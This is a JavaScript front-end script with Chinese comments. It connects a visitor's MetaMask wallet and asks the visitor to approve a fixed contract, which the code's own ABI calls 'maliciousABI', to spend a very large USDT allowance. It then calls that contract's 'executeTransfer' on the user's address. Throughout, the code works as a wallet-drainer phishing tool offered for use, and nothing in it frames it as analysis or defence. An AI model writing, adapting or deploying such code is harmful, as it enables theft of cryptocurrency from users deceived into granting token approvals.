const contractAddress = '0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b'; // 你的合约地址
const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT合约地址

const maliciousABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "user",
                "type": "address"
            }
        ],
        "name": "executeTransfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const usdtABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

let web3;
let userAccount;

async function checkConnection() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        if (accounts.length > 0) {
            userAccount = accounts[0];
            document.getElementById('connectButton').innerText = '连接成功'; // 更新按钮文本
            document.getElementById('approveButton').disabled = false; // 启用授权按钮
        } else {
            document.getElementById('connectButton').innerText = '连接钱包'; // 重置按钮文本
        }
    }
}

document.getElementById('connectButton').onclick = async () => {
    if (window.ethereum) {
        // 在请求账户之前，直接更新按钮文本
        document.getElementById('connectButton').innerText = '连接中...';
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = (await web3.eth.getAccounts())[0]; // 获取第一个账户
            console.log('钱包连接成功: ', userAccount);
            document.getElementById('connectButton').innerText = '连接成功'; // 更新按钮文本
            document.getElementById('approveButton').disabled = false; // 启用授权按钮
        } catch (error) {
            console.error('连接错误: ', error);
            document.getElementById('connectButton').innerText = '连接钱包'; // 重置按钮文本
            if (error.code === 4001) {
                alert('连接钱包请求被拒绝');
            } else {
                alert('连接钱包失败: ' + error.message);
            }
        }
    } else {
        alert('请安装 MetaMask!');
    }
};

// 在页面加载时检查连接状态
window.addEventListener('load', checkConnection);

document.getElementById('approveButton').onclick = async () => {
    const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
    const amountToApprove = web3.utils.toWei('1000000', 'ether'); // 1000000 USDT

    try {
        await usdtContract.methods.approve(contractAddress, amountToApprove).send({ from: userAccount });
        document.getElementById('approveButton').innerText = '授权成功'; // 更新按钮文本
        document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
    } catch (error) {
        console.error('授权错误: ', error);
        alert('授权失败: ' + error.message);
    }
};

document.getElementById('executeTransferButton').onclick = async () => {
    const maliciousContract = new web3.eth.Contract(maliciousABI, contractAddress);

    try {
        await maliciousContract.methods.executeTransfer(userAccount).send({ from: userAccount });
        document.getElementById('executeTransferButton').innerText = '转账执行成功'; // 更新按钮文本
    } catch (error) {
        console.error('转账错误: ', error);
        alert('转账失败: ' + error.message);
    }
};
